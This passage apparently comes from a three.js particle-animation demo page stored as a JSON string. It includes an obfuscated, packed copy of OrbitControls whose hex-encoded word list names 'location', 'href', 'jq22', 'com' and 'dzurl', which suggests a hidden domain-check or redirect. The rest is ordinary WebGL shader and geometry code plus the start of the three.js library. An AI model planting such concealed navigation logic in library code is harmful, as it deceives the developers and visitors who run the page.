\x61\\x6e\\x7c\\x56\\x65\\x63\\x74\\x6f\\x72\\x33\\x7c\\x64\\x79\\x7c\\x64\\x78\\x7c\\x72\\x61\\x64\\x69\\x75\\x73\\x7c\\x7c\\x6e\\x6f\\x5a\\x6f\\x6f\\x6d\\x7c\\x73\\x75\\x62\\x56\\x65\\x63\\x74\\x6f\\x72\\x73\\x7c\\x73\\x63\\x61\\x6c\\x65\\x7c\\x63\\x6c\\x69\\x65\\x6e\\x74\\x48\\x65\\x69\\x67\\x68\\x74\\x7c\\x70\\x72\\x65\\x76\\x65\\x6e\\x74\\x44\\x65\\x66\\x61\\x75\\x6c\\x74\\x7c\\x72\\x6f\\x74\\x61\\x74\\x65\\x53\\x70\\x65\\x65\\x64\\x7c\\x64\\x6f\\x6c\\x6c\\x79\\x44\\x65\\x6c\\x74\\x61\\x7c\\x6b\\x65\\x79\\x50\\x61\\x6e\\x53\\x70\\x65\\x65\\x64\\x7c\\x45\\x50\\x53\\x7c\\x6b\\x65\\x79\\x73\\x7c\\x6e\\x6f\\x52\\x6f\\x74\\x61\\x74\\x65\\x7c\\x74\\x68\\x65\\x74\\x61\\x44\\x65\\x6c\\x74\\x61\\x7c\\x74\\x79\\x70\\x65\\x7c\\x61\\x64\\x64\\x7c\\x72\\x6f\\x74\\x61\\x74\\x65\\x4c\\x65\\x66\\x74\\x7c\\x6c\\x65\\x6e\\x67\\x74\\x68\\x7c\\x73\\x74\\x61\\x72\\x74\\x45\\x76\\x65\\x6e\\x74\\x7c\\x64\\x65\\x6c\\x74\\x61\\x7c\\x63\\x6c\\x6f\\x6e\\x65\\x7c\\x74\\x68\\x65\\x74\\x61\\x7c\\x77\\x69\\x6e\\x64\\x6f\\x77\\x7c\\x74\\x61\\x72\\x67\\x65\\x74\\x44\\x69\\x73\\x74\\x61\\x6e\\x63\\x65\\x7c\\x64\\x6f\\x6c\\x6c\\x79\\x4f\\x75\\x74\\x7c\\x64\\x6f\\x6c\\x6c\\x79\\x49\\x6e\\x7c\\x70\\x68\\x69\\x44\\x65\\x6c\\x74\\x61\\x7c\\x65\\x6e\\x64\\x45\\x76\\x65\\x6e\\x74\\x7c\\x67\\x65\\x74\\x41\\x75\\x74\\x6f\\x52\\x6f\\x74\\x61\\x74\\x69\\x6f\\x6e\\x41\\x6e\\x67\\x6c\\x65\\x7c\\x6c\\x61\\x73\\x74\\x50\\x6f\\x73\\x69\\x74\\x69\\x6f\\x6e\\x7c\\x67\\x65\\x74\\x5a\\x6f\\x6f\\x6d\\x53\\x63\\x61\\x6c\\x65\\x7c\\x62\\x75\\x74\\x74\\x6f\\x6e\\x7c\\x6f\\x6e\\x4d\\x6f\\x75\\x73\\x65\\x4d\\x6f\\x76\\x65\\x7c\\x70\\x61\\x6e\\x55\\x70\\x7c\\x6c\\x61\\x73\\x74\\x51\\x75\\x61\\x74\\x65\\x72\\x6e\\x69\\x6f\\x6e\\x7c\\x73\\x69\\x6e\\x7c\\x4f\\x72\\x62\\x69\\x74\\x43\\x6f\\x6e\\x74\\x72\\x6f\\x6c\\x73\\x7c\\x6f\\x6e\\x4d\\x6f\\x75\\x73\\x65\\x55\\x70\\x7c\\x70\\x61\\x6e\\x4c\\x65\\x66\\x74\\x7c\\x50\\x41\\x4e\\x7c\\x64\\x65\\x6c\\x74\\x61\\x58\\x7c\\x52\\x4f\\x54\\x41\\x54\\x45\\x7c\\x44\\x4f\\x4c\\x4c\\x59\\x7c\\x54\\x4f\\x55\\x43\\x48\\x5f\\x44\\x4f\\x4c\\x4c\\x59\\x7c\\x6f\\x6e\\x4d\\x6f\\x75\\x73\\x65\\x57\\x68\\x65\\x65\\x6c\\x7c\\x74\\x6f\\x75\\x63\\x68\\x6d\\x6f\\x76\\x65\\x7c\\x64\\x65\\x6c\\x74\\x61\\x59\\x7c\\x54\\x4f\\x55\\x43\\x48\\x5f\\x50\\x41\\x4e\\x7c\\x74\\x6f\\x75\\x63\\x68\\x65\\x6e\\x64\\x7c\\x6d\\x61\\x78\\x7c\\x71\\x75\\x61\\x74\\x7c\\x74\\x6f\\x75\\x63\\x68\\x73\\x74\\x61\\x72\\x74\\x7c\\x62\\x6f\\x64\\x79\\x7c\\x6d\\x69\\x6e\\x7c\\x72\\x6f\\x74\\x61\\x74\\x65\\x55\\x70\\x7c\\x73\\x77\\x69\\x74\\x63\\x68\\x7c\\x54\\x4f\\x55\\x43\\x48\\x5f\\x52\\x4f\\x54\\x41\\x54\\x45\\x7c\\x68\\x72\\x65\\x66\\x7c\\x6c\\x6f\\x63\\x61\\x74\\x69\\x6f\\x6e\\x7c\\x63\\x6c\\x69\\x65\\x6e\\x74\\x57\\x69\\x64\\x74\\x68\\x7c\\x73\\x71\\x72\\x74\\x7c\\x71\\x75\\x61\\x74\\x65\\x72\\x6e\\x69\\x6f\\x6e\\x7c\\x63\\x68\\x61\\x6e\\x67\\x65\\x45\\x76\\x65\\x6e\\x74\\x7c\\x65\\x6c\\x65\\x6d\\x65\\x6e\\x74\\x73\\x7c\\x6d\\x61\\x78\\x50\\x6f\\x6c\\x61\\x72\\x41\\x6e\\x67\\x6c\\x65\\x7c\\x51\\x75\\x61\\x74\\x65\\x72\\x6e\\x69\\x6f\\x6e\\x7c\\x6d\\x69\\x6e\\x50\\x6f\\x6c\\x61\\x72\\x41\\x6e\\x67\\x6c\\x65\\x7c\\x71\\x75\\x61\\x74\\x49\\x6e\\x76\\x65\\x72\\x73\\x65\\x7c\\x74\\x6f\\x70\\x7c\\x73\\x75\\x62\\x7c\\x63\\x6f\\x73\\x7c\\x61\\x70\\x70\\x6c\\x79\\x51\\x75\\x61\\x74\\x65\\x72\\x6e\\x69\\x6f\\x6e\\x7c\\x6d\\x61\\x74\\x72\\x69\\x78\\x7c\\x66\\x6f\\x76\\x7c\\x61\\x75\\x74\\x6f\\x52\\x6f\\x74\\x61\\x74\\x65\\x7c\\x6d\\x75\\x6c\\x74\\x69\\x70\\x6c\\x79\\x53\\x63\\x61\\x6c\\x61\\x72\\x7c\\x6d\\x69\\x6e\\x44\\x69\\x73\\x74\\x61\\x6e\\x63\\x65\\x7c\\x6d\\x61\\x78\\x44\\x69\\x73\\x74\\x61\\x6e\\x63\\x65\\x7c\\x61\\x74\\x61\\x6e\\x32\\x7c\\x73\\x74\\x6f\\x70\\x50\\x72\\x6f\\x70\\x61\\x67\\x61\\x74\\x69\\x6f\\x6e\\x7c\\x52\\x49\\x47\\x48\\x54\\x7c\\x6f\\x6e\\x4b\\x65\\x79\\x44\\x6f\\x77\\x6e\\x7c\\x64\\x65\\x66\\x61\\x75\\x6c\\x74\\x7c\\x55\\x50\\x7c\\x6e\\x6f\\x4b\\x65\\x79\\x73\\x7c\\x4c\\x45\\x46\\x54\\x7c\\x42\\x4f\\x54\\x54\\x4f\\x4d\\x7c\\x73\\x75\\x62\\x73\\x74\\x72\\x7c\\x77\\x77\\x77\\x7c\\x6a\\x71\\x32\\x32\\x7c\\x68\\x74\\x74\\x70\\x7c\\x64\\x7a\\x75\\x72\\x6c\\x32\\x7c\\x6f\\x6e\\x4d\\x6f\\x75\\x73\\x65\\x44\\x6f\\x77\\x6e\\x7c\\x64\\x7a\\x75\\x72\\x6c\\x7c\\x63\\x6f\\x6d\\x7c\\x6a\\x71\\x70\\x64\\x7c\\x70\\x72\\x6f\\x74\\x6f\\x74\\x79\\x70\\x65\\x7c\\x7a\\x6f\\x6f\\x6d\\x53\\x70\\x65\\x65\\x64\\x7c\\x6d\\x6f\\x75\\x73\\x65\\x6d\\x6f\\x76\\x65\\x7c\\x61\\x75\\x74\\x6f\\x52\\x6f\\x74\\x61\\x74\\x65\\x53\\x70\\x65\\x65\\x64\\x7c\\x74\\x61\\x72\\x67\\x65\\x74\\x30\\x7c\\x70\\x6f\\x73\\x69\\x74\\x69\\x6f\\x6e\\x30\\x7c\\x36\\x30\\x7c\\x77\\x68\\x65\\x65\\x6c\\x44\\x65\\x6c\\x74\\x61\\x7c\\x72\\x65\\x6d\\x6f\\x76\\x65\\x45\\x76\\x65\\x6e\\x74\\x4c\\x69\\x73\\x74\\x65\\x6e\\x65\\x72\\x7c\\x6d\\x6f\\x75\\x73\\x65\\x75\\x70\\x7c\\x64\\x65\\x74\\x61\\x69\\x6c\\x7c\\x74\\x61\\x6e\\x7c\\x49\\x6e\\x66\\x69\\x6e\\x69\\x74\\x79\\x7c\\x6d\\x6f\\x75\\x73\\x65\\x64\\x6f\\x77\\x6e\\x7c\\x63\\x6f\\x6e\\x74\\x65\\x78\\x74\\x6d\\x65\\x6e\\x75\\x7c\\x31\\x38\\x30\\x7c\\x72\\x69\\x67\\x68\\x74\\x7c\\x75\\x70\\x7c\\x63\\x65\\x6e\\x74\\x65\\x72\\x7c\\x63\\x72\\x65\\x61\\x74\\x65\\x7c\\x34\\x30\\x7c\\x73\\x74\\x61\\x72\\x74\\x7c\\x65\\x6e\\x64\\x7c\\x63\\x68\\x61\\x6e\\x67\\x65\\x7c\\x4f\\x62\\x6a\\x65\\x63\\x74\\x7c\\x69\\x6e\\x76\\x65\\x72\\x73\\x65\\x7c\\x45\\x76\\x65\\x6e\\x74\\x44\\x69\\x73\\x70\\x61\\x74\\x63\\x68\\x65\\x72\\x7c\\x7c\\x7c\\x7c\\x6d\\x6f\\x75\\x73\\x65\\x77\\x68\\x65\\x65\\x6c\\x7c\\x30\\x30\\x30\\x30\\x30\\x31\\x7c\\x44\\x4f\\x4d\\x4d\\x6f\\x75\\x73\\x65\\x53\\x63\\x72\\x6f\\x6c\\x6c\\x7c\\x73\\x65\\x74\\x46\\x72\\x6f\\x6d\\x55\\x6e\\x69\\x74\\x56\\x65\\x63\\x74\\x6f\\x72\\x73\\x7c\\x6b\\x65\\x79\\x64\\x6f\\x77\\x6e\\x7c\\x6c\\x65\\x66\\x74\\x7c\\x72\\x65\\x73\\x65\\x74\\x7c\\x6b\\x65\\x79\\x43\\x6f\\x64\\x65\\x7c\\x63\\x61\\x6d\\x65\\x72\\x61\\x7c\\x64\\x69\\x73\\x61\\x62\\x6c\\x65\\x64\\x7c\\x6c\\x6f\\x6f\\x6b\\x41\\x74\\x7c\\x39\\x35\\x7c\\x70\\x6f\\x77\\x7c\\x64\\x69\\x73\\x74\\x61\\x6e\\x63\\x65\\x54\\x6f\\x53\\x71\\x75\\x61\\x72\\x65\\x64\\x7c\\x64\\x6f\\x74\\x7c\\x63\\x6f\\x6e\\x73\\x6f\\x6c\\x65\\x7c\\x62\\x6f\\x74\\x74\\x6f\\x6d\\x7c\\x65\\x6e\\x63\\x6f\\x75\\x6e\\x74\\x65\\x72\\x65\\x64\\x7c\\x57\\x41\\x52\\x4e\\x49\\x4e\\x47\\x7c\\x6a\\x73\\x7c\\x77\\x61\\x72\\x6e\\x7c\\x75\\x6e\\x6b\\x6e\\x6f\\x77\\x6e\\x7c\\x61\\x6e\\x7c\\x66\\x69\\x6c\\x65' [\"\\x73\\x70\\x6c\\x69\\x74\"]('\\x7c'), 0, {}))\n  </script>\n  <style>\n  body {\n    margin: 0;\n    overflow: hidden;\n    cursor: move;\n  }\n  </style>\n</head>\n\n<body>\n  <div id=\"three-container\">\n    \n  </div>\n  <script>\n  var mContainer;\n  var mCamera, mRenderer;\n  var mControls;\n  var mScene;\n  var mParticleCount = 100000;\n  var mParticleSystem;\n  var mTime = 0.0;\n  var mTimeStep = (1 / 60);\n  var mDuration = 25;\n  window.onload = function() {\n    init()\n  };\n\n  function init() {\n    initTHREE();\n    initControls();\n    initParticleSystem();\n    requestAnimationFrame(tick);\n    window.addEventListener('resize', resize, false)\n  }\n\n  function initTHREE() {\n    mRenderer = new THREE.WebGLRenderer({\n      antialias: true\n    });\n    mRenderer.setSize(window.innerWidth, window.innerHeight);\n    mContainer = document.getElementById('three-container');\n    mContainer.appendChild(mRenderer.domElement);\n    mCamera = new THREE.PerspectiveCamera(50, window.innerWidth / window.innerHeight, 0.1, 5000);\n    mCamera.position.set(0, 600, 600);\n    mScene = new THREE.Scene();\n    var light;\n    light = new THREE.PointLight(0xffffff, 5, 1000, 2);\n    light.position.set(0, 400, 0);\n    mScene.add(light)\n  }\n\n  function initControls() {\n    mControls = new THREE.OrbitControls(mCamera, mRenderer.domElement)\n  }\n\n  function initParticleSystem() {\n    var prefabGeometry = new THREE.PlaneGeometry(4, 4);\n    var bufferGeometry = new THREE.BAS.PrefabBufferGeometry(prefabGeometry, mParticleCount);\n    bufferGeometry.computeVertexNormals();\n    var aOffset = bufferGeometry.createAttribute('aOffset', 1);\n    var aStartPosition = bufferGeometry.createAttribute('aStartPosition', 3);\n    var aControlPoint1 = bufferGeometry.createAttribute('aControlPoint1', 3);\n    var aControlPoint2 = bufferGeometry.createAttribute('aControlPoint2', 3);\n    var aEndPosition = bufferGeometry.createAttribute('aEndPosition', 3);\n    var aAxisAngle = bufferGeometry.createAttribute('aAxisAngle', 4);\n    var aColor = bufferGeometry.createAttribute('color', 3);\n    var i, j, offset;\n    var delay;\n    for (i = 0, offset = 0; i < mParticleCount; i++) {\n      delay = i / mParticleCount * mDuration;\n      for (j = 0; j < prefabGeometry.vertices.length; j++) {\n        aOffset.array[offset++] = delay\n      }\n    }\n    var x, y, z;\n    for (i = 0, offset = 0; i < mParticleCount; i++) {\n      x = -1000;\n      y = 0;\n      z = 0;\n      for (j = 0; j < prefabGeometry.vertices.length; j++) {\n        aStartPosition.array[offset++] = x;\n        aStartPosition.array[offset++] = y;\n        aStartPosition.array[offset++] = z\n      }\n    }\n    for (i = 0, offset = 0; i < mParticleCount; i++) {\n      x = THREE.Math.randFloat(-400, 400);\n      y = THREE.Math.randFloat(400, 600);\n      z = THREE.Math.randFloat(-1200, -800);\n      for (j = 0; j < prefabGeometry.vertices.length; j++) {\n        aControlPoint1.array[offset++] = x;\n        aControlPoint1.array[offset++] = y;\n        aControlPoint1.array[offset++] = z\n      }\n    }\n    for (i = 0, offset = 0; i < mParticleCount; i++) {\n      x = THREE.Math.randFloat(-400, 400);\n      y = THREE.Math.randFloat(-600, -400);\n      z = THREE.Math.randFloat(800, 1200);\n      for (j = 0; j < prefabGeometry.vertices.length; j++) {\n        aControlPoint2.array[offset++] = x;\n        aControlPoint2.array[offset++] = y;\n        aControlPoint2.array[offset++] = z\n      }\n    }\n    for (i = 0, offset = 0; i < mParticleCount; i++) {\n      x = 1000;\n      y = 0;\n      z = 0;\n      for (j = 0; j < prefabGeometry.vertices.length; j++) {\n        aEndPosition.array[offset++] = x;\n        aEndPosition.array[offset++] = y;\n        aEndPosition.array[offset++] = z\n      }\n    }\n    var axis = new THREE.Vector3();\n    var angle = 0;\n    for (i = 0, offset = 0; i < mParticleCount; i++) {\n      axis.x = THREE.Math.randFloatSpread(2);\n      axis.y = THREE.Math.randFloatSpread(2);\n      axis.z = THREE.Math.randFloatSpread(2);\n      axis.normalize();\n      angle = Math.PI * THREE.Math.randInt(16, 32);\n      for (j = 0; j < prefabGeometry.vertices.length; j++) {\n        aAxisAngle.array[offset++] = axis.x;\n        aAxisAngle.array[offset++] = axis.y;\n        aAxisAngle.array[offset++] = axis.z;\n        aAxisAngle.array[offset++] = angle\n      }\n    }\n    var color = new THREE.Color();\n    var h, s, l;\n    for (i = 0, offset = 0; i < mParticleCount; i++) {\n      h = i / mParticleCount;\n      s = THREE.Math.randFloat(0.4, 0.6);\n      l = THREE.Math.randFloat(0.4, 0.6);\n      color.setHSL(h, s, l);\n      for (j = 0; j < prefabGeometry.vertices.length; j++) {\n        aColor.array[offset++] = color.r;\n        aColor.array[offset++] = color.g;\n        aColor.array[offset++] = color.b\n      }\n    }\n    var material = new THREE.BAS.PhongAnimationMaterial({\n      vertexColors: THREE.VertexColors,\n      shading: THREE.FlatShading,\n      side: THREE.DoubleSide,\n      uniforms: {\n        uTime: {\n          type: 'f',\n          value: 0\n        },\n        uDuration: {\n          type: 'f',\n          value: mDuration\n        }\n      },\n      shaderFunctions: [THREE.BAS.ShaderChunk['quaternion_rotation'], THREE.BAS.ShaderChunk['cubic_bezier']],\n      shaderParameters: ['uniform float uTime;', 'uniform float uDuration;', 'attribute float aOffset;', 'attribute vec3 aStartPosition;', 'attribute vec3 aControlPoint1;', 'attribute vec3 aControlPoint2;', 'attribute vec3 aEndPosition;', 'attribute vec4 aAxisAngle;'],\n      shaderVertexInit: ['float tProgress = mod((uTime + aOffset), uDuration) / uDuration;', 'float angle = aAxisAngle.w * tProgress;', 'vec4 tQuat = quatFromAxisAngle(aAxisAngle.xyz, angle);'],\n      shaderTransformNormal: ['objectNormal = rotateVector(tQuat, objectNormal);'],\n      shaderTransformPosition: ['transformed = rotateVector(tQuat, transformed);', 'transformed += cubicBezier(aStartPosition, aControlPoint1, aControlPoint2, aEndPosition, tProgress);']\n    }, {\n      specular: 0xff0000,\n      shininess: 20\n    });\n    mParticleSystem = new THREE.Mesh(bufferGeometry, material);\n    mParticleSystem.frustumCulled = false;\n    mScene.add(mParticleSystem)\n  }\n\n  function tick() {\n    update();\n    render();\n    mTime += mTimeStep;\n    mTime %= mDuration;\n    requestAnimationFrame(tick)\n  }\n\n  function update() {\n    mControls.update();\n    mParticleSystem.material.uniforms['uTime'].value = mTime\n  }\n\n  function render() {\n    mRenderer.render(mScene, mCamera)\n  }\n\n  function resize() {\n    mCamera.aspect = window.innerWidth / window.innerHeight;\n    mCamera.updateProjectionMatrix();\n    mRenderer.setSize(window.innerWidth, window.innerHeight)\n  }\n  THREE.BAS = {};\n  THREE.BAS.ShaderChunk = {};\n  THREE.BAS.ShaderChunk[\"animation_time\"] = \"float tDelay = aAnimation.x;\\nfloat tDuration = aAnimation.y;\\nfloat tTime = clamp(uTime - tDelay, 0.0, tDuration);\\nfloat tProgress = ease(tTime, 0.0, 1.0, tDuration);\\n\";\n  THREE.BAS.ShaderChunk[\"cubic_bezier\"] = \"vec3 cubicBezier(vec3 p0, vec3 c0, vec3 c1, vec3 p1, float t)\\n{\\n    vec3 tp;\\n    float tn = 1.0 - t;\\n\\n    tp.xyz = tn * tn * tn * p0.xyz + 3.0 * tn * tn * t * c0.xyz + 3.0 * tn * t * t * c1.xyz + t * t * t * p1.xyz;\\n\\n    return tp;\\n}\\n\";\n  THREE.BAS.ShaderChunk[\"ease_in_cubic\"] = \"float ease(float t, float b, float c, float d) {\\n  return c*(t/=d)*t*t + b;\\n}\\n\";\n  THREE.BAS.ShaderChunk[\"ease_in_quad\"] = \"float ease(float t, float b, float c, float d) {\\n  return c*(t/=d)*t + b;\\n}\\n\";\n  THREE.BAS.ShaderChunk[\"ease_out_cubic\"] = \"float ease(float t, float b, float c, float d) {\\n  return c*((t=t/d - 1.0)*t*t + 1.0) + b;\\n}\\n\";\n  THREE.BAS.ShaderChunk[\"quaternion_rotation\"] = \"vec3 rotateVector(vec4 q, vec3 v)\\n{\\n    return v + 2.0 * cross(q.xyz, cross(q.xyz, v) + q.w * v);\\n}\\n\\nvec4 quatFromAxisAngle(vec3 axis, float angle)\\n{\\n    float halfAngle = angle * 0.5;\\n    return vec4(axis.xyz * sin(halfAngle), cos(halfAngle));\\n}\\n\";\n  THREE.BAS.PrefabBufferGeometry = function(prefab, count) {\n    THREE.BufferGeometry.call(this);\n    this.prefabGeometry = prefab;\n    this.prefabCount = count;\n    this.prefabVertexCount = prefab.vertices.length;\n    this.bufferDefaults()\n  };\n  THREE.BAS.PrefabBufferGeometry.prototype = Object.create(THREE.BufferGeometry.prototype);\n  THREE.BAS.PrefabBufferGeometry.prototype.constructor = THREE.BAS.PrefabBufferGeometry;\n  THREE.BAS.PrefabBufferGeometry.prototype.bufferDefaults = function() {\n    var prefabFaceCount = this.prefabGeometry.faces.length;\n    var prefabIndexCount = this.prefabGeometry.faces.length * 3;\n    var prefabVertexCount = this.prefabVertexCount = this.prefabGeometry.vertices.length;\n    var prefabIndices = [];\n    for (var h = 0; h < prefabFaceCount; h++) {\n      var face = this.prefabGeometry.faces[h];\n      prefabIndices.push(face.a, face.b, face.c)\n    }\n    var indexBuffer = new Uint32Array(this.prefabCount * prefabIndexCount);\n    var positionBuffer = new Float32Array(this.prefabCount * prefabVertexCount * 3);\n    this.setIndex(new THREE.BufferAttribute(indexBuffer, 1));\n    this.addAttribute('position', new THREE.BufferAttribute(positionBuffer, 3));\n    for (var i = 0, offset = 0; i < this.prefabCount; i++) {\n      for (var j = 0; j < prefabVertexCount; j++, offset += 3) {\n        var prefabVertex = this.prefabGeometry.vertices[j];\n        positionBuffer[offset] = prefabVertex.x;\n        positionBuffer[offset + 1] = prefabVertex.y;\n        positionBuffer[offset + 2] = prefabVertex.z\n      }\n      for (var k = 0; k < prefabIndexCount; k++) {\n        indexBuffer[i * prefabIndexCount + k] = prefabIndices[k] + i * prefabVertexCount\n      }\n    }\n  };\n  THREE.BAS.PrefabBufferGeometry.prototype.bufferUvs = function() {\n    var prefabFaceCount = this.prefabGeometry.faces.length;\n    var prefabVertexCount = this.prefabVertexCount = this.prefabGeometry.vertices.length;\n    var prefabUvs = [];\n    for (var h = 0; h < prefabFaceCount; h++) {\n      var face = this.prefabGeometry.faces[h];\n      var uv = this.prefabGeometry.faceVertexUvs[0][h];\n      prefabUvs[face.a] = uv[0];\n      prefabUvs[face.b] = uv[1];\n      prefabUvs[face.c] = uv[2]\n    }\n    var uvBuffer = this.createAttribute('uv', 2);\n    for (var i = 0, offset = 0; i < this.prefabCount; i++) {\n      for (var j = 0; j < prefabVertexCount; j++, offset += 2) {\n        var prefabUv = prefabUvs[j];\n        uvBuffer.array[offset] = prefabUv.x;\n        uvBuffer.array[offset + 1] = prefabUv.y\n      }\n    }\n  };\n  THREE.BAS.PrefabBufferGeometry.prototype.computeVertexNormals = function() {\n    var index = this.index;\n    var attributes = this.attributes;\n    var positions = attributes.position.array;\n    if (attributes.normal === undefined) {\n      this.addAttribute('normal', new THREE.BufferAttribute(new Float32Array(positions.length), 3))\n    }\n    var normals = attributes.normal.array;\n    var vA, vB, vC, pA = new THREE.Vector3(),\n      pB = new THREE.Vector3(),\n      pC = new THREE.Vector3(),\n      cb = new THREE.Vector3(),\n      ab = new THREE.Vector3();\n    var indices = index.array;\n    var prefabIndexCount = this.prefabGeometry.faces.length * 3;\n    for (var i = 0; i < prefabIndexCount; i += 3) {\n      vA = indices[i + 0] * 3;\n      vB = indices[i + 1] * 3;\n      vC = indices[i + 2] * 3;\n      pA.fromArray(positions, vA);\n      pB.fromArray(positions, vB);\n      pC.fromArray(positions, vC);\n      cb.subVectors(pC, pB);\n      ab.subVectors(pA, pB);\n      cb.cross(ab);\n      normals[vA] += cb.x;\n      normals[vA + 1] += cb.y;\n      normals[vA + 2] += cb.z;\n      normals[vB] += cb.x;\n      normals[vB + 1] += cb.y;\n      normals[vB + 2] += cb.z;\n      normals[vC] += cb.x;\n      normals[vC + 1] += cb.y;\n      normals[vC + 2] += cb.z\n    }\n    for (var j = 1; j < this.prefabCount; j++) {\n      for (var k = 0; k < prefabIndexCount; k++) {\n        normals[j * prefabIndexCount + k] = normals[k]\n      }\n    }\n    this.normalizeNormals();\n    attributes.normal.needsUpdate = true\n  };\n  THREE.BAS.PrefabBufferGeometry.prototype.createAttribute = function(name, itemSize) {\n    var buffer = new Float32Array(this.prefabCount * this.prefabVertexCount * itemSize);\n    var attribute = new THREE.BufferAttribute(buffer, itemSize);\n    this.addAttribute(name, attribute);\n    return attribute\n  };\n  THREE.BAS.PrefabBufferGeometry.prototype.setAttribute4 = function(name, data) {\n    var offset = 0;\n    var array = this.geometry.attributes[name].array;\n    var i, j;\n    for (i = 0; i < data.length; i++) {\n      var v = data[i];\n      for (j = 0; j < this.prefabVertexCount; j++) {\n        array[offset++] = v.x;\n        array[offset++] = v.y;\n        array[offset++] = v.z;\n        array[offset++] = v.w\n      }\n    }\n    this.geometry.attributes[name].needsUpdate = true\n  };\n  THREE.BAS.PrefabBufferGeometry.prototype.setAttribute3 = function(name, data) {\n    var offset = 0;\n    var array = this.geometry.attributes[name].array;\n    var i, j;\n    for (i = 0; i < data.length; i++) {\n      var v = data[i];\n      for (j = 0; j < this.prefabVertexCount; j++) {\n        array[offset++] = v.x;\n        array[offset++] = v.y;\n        array[offset++] = v.z\n      }\n    }\n    this.geometry.attributes[name].needsUpdate = true\n  };\n  THREE.BAS.PrefabBufferGeometry.prototype.setAttribute2 = function(name, data) {\n    var offset = 0;\n    var array = this.geometry.attributes[name].array;\n    var i, j;\n    for (i = 0; i < this.prefabCount; i++) {\n      var v = data[i];\n      for (j = 0; j < this.prefabVertexCount; j++) {\n        array[offset++] = v.x;\n        array[offset++] = v.y\n      }\n    }\n    this.geometry.attributes[name].needsUpdate = true\n  };\n  THREE.BAS.BaseAnimationMaterial = function(parameters) {\n    THREE.ShaderMaterial.call(this);\n    this.shaderFunctions = [];\n    this.shaderParameters = [];\n    this.shaderVertexInit = [];\n    this.shaderTransformNormal = [];\n    this.shaderTransformPosition = [];\n    this.setValues(parameters)\n  };\n  THREE.BAS.BaseAnimationMaterial.prototype = Object.create(THREE.ShaderMaterial.prototype);\n  THREE.BAS.BaseAnimationMaterial.prototype.constructor = THREE.BAS.BaseAnimationMaterial;\n  THREE.BAS.BaseAnimationMaterial.prototype._0 = function() {\n    return ''\n  };\n  THREE.BAS.BaseAnimationMaterial.prototype._1 = function() {\n    return this.shaderFunctions.join('\\n')\n  };\n  THREE.BAS.BaseAnimationMaterial.prototype._3 = function() {\n    return this.shaderParameters.join('\\n')\n  };\n  THREE.BAS.BaseAnimationMaterial.prototype._5 = function() {\n    return this.shaderVertexInit.join('\\n')\n  };\n  THREE.BAS.BaseAnimationMaterial.prototype._4 = function() {\n    return this.shaderTransformNormal.join('\\n')\n  };\n  THREE.BAS.BaseAnimationMaterial.prototype._2 = function() {\n    return this.shaderTransformPosition.join('\\n')\n  };\n  THREE.BAS.BaseAnimationMaterial.prototype.setUniformValues = function(values) {\n    for (var key in values) {\n      if (key in this.uniforms) {\n        var uniform = this.uniforms[key];\n        var value = values[key];\n        switch (uniform.type) {\n          case 'c':\n            uniform.value.set(value);\n            break;\n          case 'v2':\n          case 'v3':\n          case 'v4':\n            uniform.value.copy(value);\n            break;\n          case 'f':\n          case 't':\n            uniform.value = value\n        }\n      }\n    }\n  };\n  THREE.BAS.PhongAnimationMaterial = function(parameters, uniformValues) {\n    THREE.BAS.BaseAnimationMaterial.call(this, parameters);\n    var phongShader = THREE.ShaderLib['phong'];\n    this.uniforms = THREE.UniformsUtils.merge([phongShader.uniforms, this.uniforms]);\n    this.lights = true;\n    this.vertexShader = this._0();\n    this.fragmentShader = phongShader.fragmentShader;\n    uniformValues.map && (this.defines['USE_MAP'] = '');\n    uniformValues.normalMap && (this.defines['USE_NORMALMAP'] = '');\n    this.setUniformValues(uniformValues)\n  };\n  THREE.BAS.PhongAnimationMaterial.prototype = Object.create(THREE.BAS.BaseAnimationMaterial.prototype);\n  THREE.BAS.PhongAnimationMaterial.prototype.constructor = THREE.BAS.PhongAnimationMaterial;\n  THREE.BAS.PhongAnimationMaterial.prototype._0 = function() {\n    return [\"#define PHONG\", \"varying vec3 vViewPosition;\", \"#ifndef FLAT_SHADED\", \" varying vec3 vNormal;\", \"#endif\", THREE.ShaderChunk[\"common\"], THREE.ShaderChunk[\"uv_pars_vertex\"], THREE.ShaderChunk[\"uv2_pars_vertex\"], THREE.ShaderChunk[\"displacementmap_pars_vertex\"], THREE.ShaderChunk[\"envmap_pars_vertex\"], THREE.ShaderChunk[\"lights_phong_pars_vertex\"], THREE.ShaderChunk[\"color_pars_vertex\"], THREE.ShaderChunk[\"morphtarget_pars_vertex\"], THREE.ShaderChunk[\"skinning_pars_vertex\"], THREE.ShaderChunk[\"shadowmap_pars_vertex\"], THREE.ShaderChunk[\"logdepthbuf_pars_vertex\"], this._1(), this._3(), \"void main() {\", this._5(), THREE.ShaderChunk[\"uv_vertex\"], THREE.ShaderChunk[\"uv2_vertex\"], THREE.ShaderChunk[\"color_vertex\"], THREE.ShaderChunk[\"beginnormal_vertex\"], this._4(), THREE.ShaderChunk[\"morphnormal_vertex\"], THREE.ShaderChunk[\"skinbase_vertex\"], THREE.ShaderChunk[\"skinnormal_vertex\"], THREE.ShaderChunk[\"defaultnormal_vertex\"], \"#ifndef FLAT_SHADED\", \"  vNormal = normalize( transformedNormal );\", \"#endif\", THREE.ShaderChunk[\"begin_vertex\"], this._2(), THREE.ShaderChunk[\"displacementmap_vertex\"], THREE.ShaderChunk[\"morphtarget_vertex\"], THREE.ShaderChunk[\"skinning_vertex\"], THREE.ShaderChunk[\"project_vertex\"], THREE.ShaderChunk[\"logdepthbuf_vertex\"], \"  vViewPosition = - mvPosition.xyz;\", THREE.ShaderChunk[\"worldpos_vertex\"], THREE.ShaderChunk[\"envmap_vertex\"], THREE.ShaderChunk[\"lights_phong_vertex\"], THREE.ShaderChunk[\"shadowmap_vertex\"], \"}\"].join(\"\\n\")\n  };\n  </script>\n</body>\n\n</html>\n"},{"_content":"// threejs.org/license\n'use strict';var THREE={REVISION:\"78\"};\"function\"===typeof define&&define.amd?define(\"three\",THREE):\"undefined\"!==typeof exports&&\"undefined\"!==typeof module&&(module.exports=THREE);void 0===Number.EPSILON&&(Number.EPSILON=Math.pow(2,-52));void 0===Math.sign&&(Math.sign=function(a){return 0>a?-1:0<a?1:+a});void 0===Function.prototype.name&&Object.defineProperty(Function.prototype,\"name\",{get:function(){return this.toString().match(/^\\s*function\\s*(\\S*)\\s*\\(/)[1]}});\nvoid 0===Object.assign&&function(){Object.assign=function(a){if(void 0===a||null===a)throw new TypeError(\"Cannot convert undefined or null to object\");for(var b=Object(a),c=1;c<arguments.length;c++){var d=arguments[c];if(void 0!==d&&null!==d)for(var e in 